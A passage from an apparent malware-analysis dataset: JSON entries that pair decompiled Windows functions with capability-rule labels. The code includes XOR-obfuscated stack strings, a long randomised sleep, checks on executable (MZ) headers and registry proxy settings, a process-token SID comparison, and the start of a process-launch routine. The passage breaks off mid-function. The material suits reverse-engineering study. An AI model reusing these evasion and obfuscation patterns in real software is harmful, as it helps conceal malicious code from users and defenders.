fcn.004245f0(&var_20h);\n                    uVar2 = fcn.00401850(&var_84h);\n                    dwMilliseconds = uVar2 % 600000 + 60000;\n                    (*_sym.imp.KERNEL32.dll_Sleep)(dwMilliseconds);\n                    fcn.004012d0();\n                }\n                else {\n                    if (((4 < var_18h) && (var_18h == var_20h)) &&\n                       ((var_1ch != NULL && ((*var_1ch == 'M' && (var_1ch[1] == 'Z')))))) {\n                        fcn.004237a0(arg_8h, &var_20h);\n                        fcn.004245f0(&var_20h);\n                        fcn.004012d0();\n                        goto code_r0x00422c5a;\n                    }\n                    fcn.004012d0();\n                }\n            }\n            else {\n                fcn.004012d0();\n            }\n        }\n        var_ch = var_ch + 1;\n    } while( true );\n}\n",
        "token_count": 2399
    },
    "00422ca0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00422ca0(uint lpFileName)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint lpBuffer;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t lpNumberOfBytesRead;\n    int32_t hObject;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    do {\n        if (4 < var_4h) {\n            return;\n        }\n        *0x436ae0 = 0;\n        hObject = (*_sym.imp.KERNEL32.dll_CreateFileW)(lpFileName, 0x80000000, 3, 0, 3, 0, 0);\n        if (hObject != 0) {\n            while ((iVar1 = (*_sym.imp.KERNEL32.dll_ReadFile)(hObject, &lpBuffer, 0x200, &lpNumberOfBytesRead, 0), \n                   iVar1 != 0 && (lpNumberOfBytesRead != 0))) {\n                *0x436ae0 = fcn.00422460(&lpBuffer, lpNumberOfBytesRead, *0x436ae0);\n            }\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n            var_14h = *0x436c00;\n            var_10h = *0x436c04;\n            iVar1 = fcn.004162b0(lpFileName, 0x436c04, 0x436c00);\n            if (iVar1 == 0) {\n                if (var_10h == 0) {\n                    return;\n                }\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_10h);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                return;\n            }\n        }\n        (*_sym.imp.KERNEL32.dll_Sleep)(5000);\n        var_4h = var_4h + 1;\n    } while( true );\n}\n",
        "token_count": 432
    },
    "00422da0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00422da0(uint hKey, uint lpValueName, int32_t *arg_10h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    var_4h = 0;\n    *arg_10h = 0;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(hKey, lpValueName, 0, 0, 0, &var_8h);\n    if (iVar1 == 0) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, var_8h + 1);\n        var_4h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        if (var_4h != 0) {\n            iVar1 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(hKey, lpValueName, 0, 0, var_4h, &var_8h);\n            if (iVar1 == 0) {\n                *arg_10h = var_4h;\n            }\n            else {\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_4h);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 323
    },
    "00422ee0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuchar fcn.00422ee0(void)\n\n{\n    uchar uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uchar *puVar4;\n    uint hKey;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uchar *var_4h;\n    \n    uVar1 = 0;\n    var_8h = 0;\n    iVar2 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(0x80000001, 0x4259d8, 0, 0x20019, &var_ch);\n    if (iVar2 == 0) {\n        iVar2 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(var_ch, 0x425a50, 0, 0, 0, &var_8h);\n        if (iVar2 == 0) {\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, var_8h);\n            var_4h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            iVar2 = var_8h;\n            puVar4 = var_4h;\n            if (var_4h != NULL) {\n                for (; iVar2 != 0; iVar2 = iVar2 + -1) {\n                    *puVar4 = 0;\n                    puVar4 = puVar4 + 1;\n                }\n                iVar2 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(var_ch, L\"ProxyEnable\", 0, 0, var_4h, &var_8h);\n                if (iVar2 == 0) {\n                    uVar1 = *var_4h;\n                }\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_4h);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                var_4h = NULL;\n            }\n        }\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(var_ch);\n    }\n    else {\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 477
    },
    "00422fc0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuchar fcn.00422fc0(void)\n\n{\n    uchar uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uchar *puVar4;\n    uint hKey;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uchar *var_4h;\n    \n    uVar1 = 0;\n    var_8h = 0;\n    iVar2 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)\n                      (0x80000001, L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\", 0, 0x20019, \n                       &var_ch);\n    if (iVar2 == 0) {\n        iVar2 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(var_ch, L\"AutoDetect\", 0, 0, 0, &var_8h);\n        if (iVar2 == 0) {\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, var_8h);\n            var_4h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            iVar2 = var_8h;\n            puVar4 = var_4h;\n            if (var_4h != NULL) {\n                for (; iVar2 != 0; iVar2 = iVar2 + -1) {\n                    *puVar4 = 0;\n                    puVar4 = puVar4 + 1;\n                }\n                iVar2 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(var_ch, L\"AutoDetect \", 0, 0, var_4h, &var_8h);\n                if (iVar2 == 0) {\n                    uVar1 = *var_4h;\n                }\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_4h);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n                var_4h = NULL;\n            }\n        }\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(var_ch);\n    }\n    else {\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 485
    },
    "004230a0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004230a0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uchar *puVar4;\n    uint var_8f8h;\n    uint var_4f8h;\n    uint var_f8h;\n    uint var_f4h;\n    uint var_f0h;\n    uint var_ech;\n    uint var_e8h;\n    uchar var_e4h;\n    uchar var_e3h;\n    uchar var_e2h;\n    uchar var_e1h;\n    uchar var_e0h;\n    uchar var_dfh;\n    uchar var_deh;\n    uchar var_ddh;\n    uchar var_dch;\n    uchar var_dbh;\n    uchar var_dah;\n    uchar var_d9h;\n    uchar var_d8h;\n    uchar var_d7h;\n    uchar var_d6h;\n    uchar var_d5h;\n    uchar var_d4h;\n    uchar var_d3h;\n    uchar var_d2h;\n    uchar var_d1h;\n    uchar var_d0h;\n    uchar var_cfh;\n    uchar var_ceh;\n    uchar var_cdh;\n    uchar var_cch;\n    uchar var_cbh;\n    uchar var_cah;\n    uchar var_c9h;\n    uchar var_c8h;\n    uchar var_c7h;\n    uchar var_c6h;\n    uchar var_c5h;\n    uchar var_c4h;\n    uchar var_c3h;\n    uchar var_c2h;\n    uchar var_c1h;\n    uchar var_c0h;\n    uchar var_bfh;\n    uchar var_beh;\n    uchar var_bdh;\n    uchar var_bch;\n    uchar var_bbh;\n    uchar var_bah;\n    uchar var_b9h;\n    uchar var_b8h;\n    uchar var_b7h;\n    uchar var_b6h;\n    uchar var_b5h;\n    uchar var_b4h;\n    uchar var_b3h;\n    uchar var_b2h;\n    uchar var_b1h;\n    uchar var_b0h;\n    uchar var_afh;\n    uchar var_aeh;\n    uchar var_adh;\n    uchar var_ach;\n    uchar var_abh;\n    uchar var_aah;\n    uchar var_a9h;\n    uchar var_a8h;\n    uchar var_a7h;\n    uchar var_a6h;\n    uchar var_a5h;\n    uchar var_a4h;\n    uchar var_a3h;\n    uchar var_a2h;\n    uchar var_a1h;\n    uchar var_a0h;\n    uchar var_9fh;\n    uchar var_9eh;\n    uchar var_9dh;\n    uchar var_9ch;\n    uchar var_9bh;\n    uchar var_9ah;\n    uchar var_99h;\n    uchar var_98h;\n    uchar var_97h;\n    uchar var_96h;\n    uchar var_95h;\n    uchar var_94h;\n    uchar var_93h;\n    uchar var_92h;\n    uchar var_91h;\n    uchar var_90h;\n    uchar var_8fh;\n    uchar var_8eh;\n    uchar var_8dh;\n    uchar var_8ch;\n    uchar var_8bh;\n    uint8_t var_88h [4];\n    uchar var_84h;\n    uchar var_83h;\n    uchar var_82h;\n    uchar var_81h;\n    uchar var_80h;\n    uchar var_7fh;\n    uchar var_7eh;\n    uchar var_7dh;\n    uchar var_7ch;\n    uchar var_7bh;\n    uchar var_7ah;\n    uchar var_79h;\n    uchar var_78h;\n    uchar var_77h;\n    uchar var_76h;\n    uchar var_75h;\n    uchar var_74h;\n    uchar var_73h;\n    uchar var_72h;\n    uchar var_71h;\n    uchar var_70h;\n    uchar var_6fh;\n    uchar var_6eh;\n    uchar var_6dh;\n    uchar var_6ch;\n    uchar var_6bh;\n    uint var_68h;\n    uchar var_64h;\n    uchar var_63h;\n    uchar var_62h;\n    uchar var_61h;\n    uchar var_60h;\n    uchar var_5fh;\n    uchar var_5eh;\n    uchar var_5dh;\n    uchar var_5ch;\n    uchar var_5bh;\n    uchar var_5ah;\n    uchar var_59h;\n    uchar var_58h;\n    uchar var_57h;\n    uchar var_56h;\n    uchar var_55h;\n    uchar var_54h;\n    uchar var_53h;\n    uchar var_52h;\n    uchar var_51h;\n    uint var_50h;\n    uchar var_4ch;\n    uchar var_4bh;\n    uchar var_4ah;\n    uchar var_49h;\n    uchar var_48h;\n    uchar var_47h;\n    uchar var_46h;\n    uchar var_45h;\n    uchar var_44h;\n    uchar var_43h;\n    uint var_40h;\n    uchar var_3ch;\n    uchar var_3bh;\n    uint8_t var_38h [4];\n    uchar var_34h;\n    uchar var_33h;\n    uint8_t var_30h [4];\n    uchar var_2ch;\n    uchar var_2bh;\n    uint var_28h;\n    uchar var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    uint var_1h;\n    \n    var_20h = 0;\n    var_8h = 0;\n    var_1h._0_1_ = 0x22;\n    for (var_1ch = 0; var_1ch < arg_ch; var_1ch = var_1ch + 1) {\n        *(&var_4f8h + var_8h) = *(&var_8f8h + var_8h);\n        if (0x3ff < var_8h) {\n            if (var_4f8h + var_4f8h._1_1_ == var_4f8h._2_1_) {\n                puVar3 = &var_4f8h;\n                for (iVar2 = 0x400; iVar2 != 0; iVar2 = iVar2 + -1) {\n                    *puVar3 = 0;\n                    puVar3 = puVar3 + 1;\n                }\n            }\n            else {\n                puVar3 = &var_4f8h;\n                puVar4 = arg_8h + var_20h;\n                for (uVar1 = var_8h; uVar1 != 0; uVar1 = uVar1 - 1) {\n                    *puVar4 = *puVar3;\n                    puVar3 = puVar3 + 1;\n                    puVar4 = puVar4 + 1;\n                }\n            }\n            var_88h[0] = 0x1c;\n            var_88h[1] = 0x51;\n            var_88h[2] = 0x3e;\n            var_88h[3] = 0x36;\n            var_84h = 0x24;\n            var_83h = 0x34;\n            var_82h = 4;\n            var_81h = 0x51;\n            var_80h = 0x39;\n            var_7fh = 0x36;\n            var_7eh = 0x6a;\n            var_7dh = 0x34;\n            var_7ch = 0x5b;\n            var_7bh = 0x51;\n            var_7ah = 0x65;\n            var_79h = 0x36;\n            var_78h = 0x75;\n            var_77h = 0x34;\n            var_76h = 7;\n            var_75h = 0x51;\n            var_74h = 0x70;\n            var_73h = 0x36;\n            var_72h = 0x75;\n            var_71h = 0x34;\n            var_70h = 0x10;\n            var_6fh = 0x51;\n            var_6eh = 0x65;\n            var_6dh = 0x36;\n            var_6ch = 0x50;\n            var_6bh = 0x34;\n            var_30h[0] = 0x74;\n            var_30h[1] = 0x51;\n            var_30h[2] = 0x4a;\n            var_30h[3] = 0x36;\n            var_2ch = 0x50;\n            var_2bh = 0x34;\n            fcn.004012a0(0x3c);\n            for (var_ch = 0; var_ch < 0x1e; var_ch = var_ch + 1) {\n                fcn.00401280(var_ch, var_88h[var_ch] ^ var_30h[var_ch % 6]);\n            }\n            puVar3 = &var_8f8h;\n            puVar4 = arg_8h + var_20h;\n            for (uVar1 = var_8h; uVar1 != 0; uVar1 = uVar1 - 1) {\n                *puVar4 = *puVar3;\n                puVar3 = puVar3 + 1;\n                puVar4 = puVar4 + 1;\n            }\n            var_20h = var_20h + var_8h;\n            var_8h = 0;\n            fcn.004012d0();\n        }\n        var_50h._0_1_ = 0x5c;\n        var_50h._1_1_ = 8;\n        var_50h._2_1_ = 0x35;\n        var_50h._3_1_ = 0x34;\n        var_4ch = 0x11;\n        var_4bh = 0;\n        var_4ah = 0x13;\n        var_49h = 0x36;\n        var_48h = 0x25;\n        var_47h = 0x57;\n        var_46h = 0x5c;\n        var_45h = 0x5f;\n        var_44h = 0x21;\n        var_43h = 0x51;\n        var_28h._0_1_ = 0x73;\n        var_28h._1_1_ = 0x7a;\n        var_28h._2_1_ = 0x45;\n        var_28h._3_1_ = 0x51;\n        var_24h = 99;\n        fcn.004012a0(0xe);\n        for (var_10h = 0; var_10h < 0xe; var_10h = var_10h + 1) {\n            fcn.00401280(var_10h, *(&var_50h + var_10h) ^ *(&var_28h + var_10h % 5));\n        }\n        *(&var_8f8h + var_8h) = *(arg_8h + var_1ch) ^ var_1h;\n        var_8h = var_8h + 1;\n        var_68h._0_1_ = 0x5d;\n        var_68h._1_1_ = 0x56;\n        var_68h._2_1_ = 0x1d;\n        var_68h._3_1_ = 0x69;\n        var_64h = 0x5d;\n        var_63h = 0x31;\n        var_62h = 0x55;\n        var_61h = 0x56;\n        var_60h = 0x16;\n        var_5fh = 0x69;\n        var_5eh = 0x51;\n        var_5dh = 0x31;\n        var_5ch = 0x53;\n        var_5bh = 0x56;\n        var_5ah = 0x40;\n        var_59h = 0x69;\n        var_58h = 0x51;\n        var_57h = 0x31;\n        var_56h = 0x48;\n        var_55h = 0x56;\n        var_54h = 0xb;\n        var_53h = 0x69;\n        var_52h = 0x34;\n        var_51h = 0x31;\n        var_38h[0] = 0x30;\n        var_38h[1] = 0x56;\n        var_38h[2] = 0x6e;\n        var_38h[3] = 0x69;\n        var_34h = 0x34;\n        var_33h = 0x31;\n        fcn.004012a0(0x30);\n        for (var_14h = 0; var_14h < 0x18; var_14h = var_14h + 1) {\n            fcn.00401280(var_14h, *(&var_68h + var_14h) ^ var_38h[var_14h % 6]);\n        }\n        var_1h._0_1_ = var_1h + (var_1ch % 0x85) * '\\x03';\n        fcn.004012d0();\n        fcn.004012d0();\n    }\n    if (var_8h != 0) {\n        var_e8h._0_1_ = 6;\n        var_e8h._1_1_ = 0x65;\n        var_e8h._2_1_ = 0x11;\n        var_e8h._3_1_ = 0x78;\n        var_e4h = 0x3c;\n        var_e3h = 0x6b;\n        var_e2h = 0x2a;\n        var_e1h = 0x65;\n        var_e0h = 7;\n        var_dfh = 0x78;\n        var_deh = 0x2f;\n        var_ddh = 0x6b;\n        var_dch = 0x3c;\n        var_dbh = 0x65;\n        var_dah = 0x15;\n        var_d9h = 0x78;\n        var_d8h = 0x12;\n        var_d7h = 0x6b;\n        var_d6h = 10;\n        var_d5h = 0x65;\n        var_d4h = 0x35;\n        var_d3h = 0x78;\n        var_d2h = 0x1d;\n        var_d1h = 0x6b;\n        var_d0h = 0xd;\n        var_cfh = 0x65;\n        var_ceh = 0x22;\n        var_cdh = 0x78;\n        var_cch = 7;\n        var_cbh = 0x6b;\n        var_cah = 0x1e;\n        var_c9h = 0x65;\n        var_c8h = 0x24;\n        var_c7h = 0x78;\n        var_c6h = 7;\n        var_c5h = 0x6b;\n        var_c4h = 1;\n        var_c3h = 0x65;\n        var_c2h = 0x3e;\n        var_c1h = 0x78;\n        var_c0h = 0x12;\n        var_bfh = 0x6b;\n        var_beh = 0x1d;\n        var_bdh = 0x65;\n        var_bch = 9;\n        var_bbh = 0x78;\n        var_bah = 0x3d;\n        var_b9h = 0x6b;\n        var_b8h = 0x3a;\n        var_b7h = 0x65;\n        var_b6h = 0x15;\n        var_b5h = 0x78;\n        var_b4h = 0x23;\n        var_b3h = 0x6b;\n        var_b2h = 0x12;\n        var_b1h = 0x65;\n        var_b0h = 0x33;\n        var_afh = 0x78;\n        var_aeh = 0x2b;\n        var_adh = 0x6b;\n        var_ach = 0x20;\n        var_abh = 0x65;\n        var_aah = 4;\n        var_a9h = 0x78;\n        var_a8h = 0x3c;\n        var_a7h = 0x6b;\n        var_a6h = 0x2f;\n        var_a5h = 0x65;\n        var_a4h = 0x1c;\n        var_a3h = 0x78;\n        var_a2h = 0x1e;\n        var_a1h = 0x6b;\n        var_a0h = 0x3c;\n        var_9fh = 0x65;\n        var_9eh = 0x1f;\n        var_9dh = 0x78;\n        var_9ch = 0x2d;\n        var_9bh = 0x6b;\n        var_9ah = 0x2b;\n        var_99h = 0x65;\n        var_98h = 3;\n        var_97h = 0x78;\n        var_96h = 0x3d;\n        var_95h = 0x6b;\n        var_94h = 0x21;\n        var_93h = 0x65;\n        var_92h = 2;\n        var_91h = 0x78;\n        var_90h = 0x12;\n        var_8fh = 0x6b;\n        var_8eh = 0x7e;\n        var_8dh = 0x65;\n        var_8ch = 0x70;\n        var_8bh = 0x78;\n        var_40h._0_1_ = 0x4e;\n        var_40h._1_1_ = 0x65;\n        var_40h._2_1_ = 0x70;\n        var_40h._3_1_ = 0x78;\n        var_3ch = 0x4e;\n        var_3bh = 0x6b;\n        fcn.004012a0(0xbc);\n        for (var_18h = 0; var_18h < 0x5e; var_18h = var_18h + 1) {\n            fcn.00401280(var_18h, *(&var_e8h + var_18h) ^ *(&var_40h + var_18h % 6));\n        }\n        puVar3 = &var_8f8h;\n        puVar4 = arg_8h + var_20h;\n        for (uVar1 = var_8h; uVar1 != 0; uVar1 = uVar1 - 1) {\n            *puVar4 = *puVar3;\n            puVar3 = puVar3 + 1;\n            puVar4 = puVar4 + 1;\n        }\n        fcn.004012d0();\n    }\n    return;\n}\n",
        "token_count": 4477
    },
    "004237a0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004237a0(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    uchar *puVar4;\n    \n    if ((arg_8h != NULL) && (arg_ch != NULL)) {\n        if (arg_8h[1] != 0) {\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, arg_8h[1]);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n        }\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, *arg_ch);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        arg_8h[1] = iVar2;\n        if (arg_8h[1] != 0) {\n            puVar3 = arg_8h[1];\n            for (iVar2 = *arg_ch; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar3 = 0;\n                puVar3 = puVar3 + 1;\n            }\n            *arg_8h = *arg_ch;\n            puVar3 = arg_ch[1];\n            puVar4 = arg_8h[1];\n            for (iVar2 = *arg_ch; iVar2 != 0; iVar2 = iVar2 + -1) {\n                *puVar4 = *puVar3;\n                puVar3 = puVar3 + 1;\n                puVar4 = puVar4 + 1;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 369
    },
    "00423830": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00423830(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint var_38h;\n    uchar var_34h;\n    uchar var_33h;\n    uchar var_32h;\n    uchar var_31h;\n    uchar var_30h;\n    uchar var_2fh;\n    uchar var_2eh;\n    uchar var_2dh;\n    uchar var_2ch;\n    uchar var_2bh;\n    uchar var_2ah;\n    uchar var_29h;\n    uchar var_28h;\n    uchar var_27h;\n    uint8_t var_24h [4];\n    uchar var_20h;\n    uchar var_1fh;\n    uint var_1ch;\n    uint var_18h;\n    uint TokenHandle;\n    int32_t StringSid;\n    uint *TokenInformation;\n    uint TokenInformationLength;\n    int32_t var_4h;\n    \n    TokenInformationLength = 0;\n    TokenHandle = 0;\n    TokenInformation = NULL;\n    StringSid = 0;\n    var_1ch = 0;\n    (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(8, &TokenHandle);\n    iVar2 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar1);\n    if (iVar2 != 0) {\n        (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(TokenHandle, 1, 0, TokenInformationLength, &TokenInformationLength)\n        ;\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if ((iVar2 == 0x7a) &&\n           (TokenInformation = (*_sym.imp.KERNEL32.dll_GlobalAlloc)(0x40, TokenInformationLength), \n           TokenInformation != NULL)) {\n            iVar2 = (*_sym.imp.ADVAPI32.dll_GetTokenInformation)\n                              (TokenHandle, 1, TokenInformation, TokenInformationLength, &TokenInformationLength);\n            if ((iVar2 != 0) &&\n               ((iVar2 = (*_sym.imp.ADVAPI32.dll_ConvertSidToStringSidW)(*TokenInformation, &StringSid),  iVar2 != 0 &&\n                (StringSid != 0)))) {\n                var_38h._0_1_ = 2;\n                var_38h._1_1_ = 0x74;\n                var_38h._2_1_ = 0x60;\n                var_38h._3_1_ = 0x72;\n                var_34h = 0x45;\n                var_33h = 0x69;\n                var_32h = 0x7c;\n                var_31h = 0x74;\n                var_30h = 0x78;\n                var_2fh = 0x72;\n                var_2eh = 0x59;\n                var_2dh = 0x69;\n                var_2ch = 0x60;\n                var_2bh = 0x74;\n                var_2ah = 0x75;\n                var_29h = 0x72;\n                var_28h = 0x74;\n                var_27h = 0x69;\n                var_24h[0] = 0x51;\n                var_24h[1] = 0x74;\n                var_24h[2] = 0x4d;\n                var_24h[3] = 0x72;\n                var_20h = 0x74;\n                var_1fh = 0x69;\n                fcn.004012a0(0x24);\n                for (var_4h = 0; var_4h < 0x12; var_4h = var_4h + 1) {\n                    fcn.00401280(var_4h, *(&var_38h + var_4h) ^ var_24h[var_4h % 6]);\n                }\n                uVar1 = fcn.00401270(StringSid);\n                iVar2 = (*_sym.imp.SHLWAPI.dll_StrCmpIW)(uVar1);\n                if (iVar2 == 0) {\n                    var_1ch = 1;\n                }\n                (*_sym.imp.KERNEL32.dll_LocalFree)(StringSid);\n                fcn.004012d0();\n            }\n            (*_sym.imp.KERNEL32.dll_GlobalFree)(TokenInformation);\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n    }\n    return var_1ch;\n}\n",
        "token_count": 1012
    },
    "00423a50": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00423a50(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_9a8h;\n    uint lpString1;\n    uint lpString2;\n    uint pExecInfo;\n    uint var_184h;\n    uint var_180h;\n    uint var_17ch;\n    uint *var_178h;\n    uint *var_174h;\n    uint var_170h;\n    uint var_16ch;\n    uint hProcess;\n    uint var_14ch;\n    uint var_148h;\n    uint var_144h;\n    uint var_140h;\n    uint var_13ch;\n    uint var_138h;\n    uint var_134h;\n    uchar var_130h;\n    uchar var_12fh;\n    uchar var_12eh;\n    uchar var_12dh;\n    uchar var_12ch;\n    uchar var_12bh;\n    uchar var_12ah;\n    uchar var_129h;\n    uchar var_128h;\n    uchar var_127h;\n    uchar var_126h;\n    uchar var_125h;\n    uchar var_124h;\n    uchar var_123h;\n    uchar var_122h;\n    uchar var_121h;\n    uchar var_120h;\n    uchar var_11fh;\n    uchar var_11eh;\n    uchar var_11dh;\n    uchar var_11ch;\n    uchar var_11bh;\n    uchar var_11ah;\n    uchar var_119h;\n    uchar var_118h;\n    uchar var_117h;\n    uchar var_116h;\n    uchar var_115h;\n    uchar var_114h;\n    uchar var_113h;\n    uchar var_112h;\n    uchar var_111h;\n    uchar var_110h;\n    uchar var_10fh;\n    uchar var_10eh;\n    uchar var_10dh;\n    uchar var_10ch;\n    uchar var_10bh;\n    uchar var_10ah;\n    uchar var_109h;\n    uchar var_108h;\n    uchar var_107h;\n    uchar var_106h;\n    uchar var_105h;\n    uchar var_104h;\n    uchar var_103h;\n    uchar var_102h;\n    uchar var_101h;\n    uchar var_100h;\n    uchar var_ffh;\n    uchar var_feh;\n    uchar var_fdh;\n    uchar var_fch;\n    uchar var_fbh;\n    uchar var_fah;\n    uchar var_f9h;\n    uchar var_f8h;\n    uchar var_f7h;\n    uchar var_f6h;\n    uchar var_f5h;\n    uchar var_f4h;\n    uchar var_f3h;\n    uchar var_f2h;\n    uchar var_f1h;\n    uchar var_f0h;\n    uchar var_efh;\n    uchar var_eeh;\n    uchar var_edh;\n    uchar var_ech;\n    uchar var_ebh;\n    uint8_t var_e8h [4];\n    uchar var_e4h;\n    uchar var_e3h;\n    uchar var_e2h;\n    uchar var_e1h;\n    uchar var_e0h;\n    uchar var_dfh;\n    uchar var_deh;\n    uchar var_ddh;\n    uchar var_dch;\n    uchar var_dbh;\n    uchar var_dah;\n    uchar var_d9h;\n    uchar var_d8h;\n    uchar var_d7h;\n    uchar var_d6h;\n    uchar var_d5h;\n    uchar var_d4h;\n    uchar var_d3h;\n    uchar var_d2h;\n    uchar var_d1h;\n    uint var_d0h;\n    uchar var_cch;\n    uchar var_cbh;\n    uchar var_cah;\n    uchar var_c9h;\n    uchar var_c8h;\n    uchar var_c7h;\n    uchar var_c6h;\n    uchar var_c5h;\n    uchar var_c4h;\n    uchar var_c3h;\n    uchar var_c2h;\n    uchar var_c1h;\n    uchar var_c0h;\n    uchar var_bfh;\n    uchar var_beh;\n    uchar var_bdh;\n    uchar var_bch;\n    uchar var_bbh;\n    uchar var_bah;\n    uchar var_b9h;\n    uint8_t var_b8h [4];\n    uchar var_b4h;\n    uchar var_b3h;\n    uchar var_b2h;\n    uchar var_b1h;\n    uchar var_b0h;\n    uchar var_afh;\n    uchar var_aeh;\n    uchar var_adh;\n    uchar var_ach;\n    uchar var_abh;\n    uchar var_aah;\n    uchar var_a9h;\n    uchar var_a8h;\n    uchar var_a7h;\n    uchar var_a6h;\n    uchar var_a5h;\n    uchar var_a4h;\n    uchar var_a3h;\n    uint var_a0h;\n    uchar var_9ch;\n    uchar var_9bh;\n    uchar var_9ah;\n    uchar var_99h;\n    uchar var_98h;\n    uchar var_97h;\n    uchar var_96h;\n    uchar var_95h;\n    uchar var_94h;\n    uchar var_93h;\n    uchar var_92h;\n    uchar var_91h;\n    uint var_90h;\n    uchar var_8ch;\n    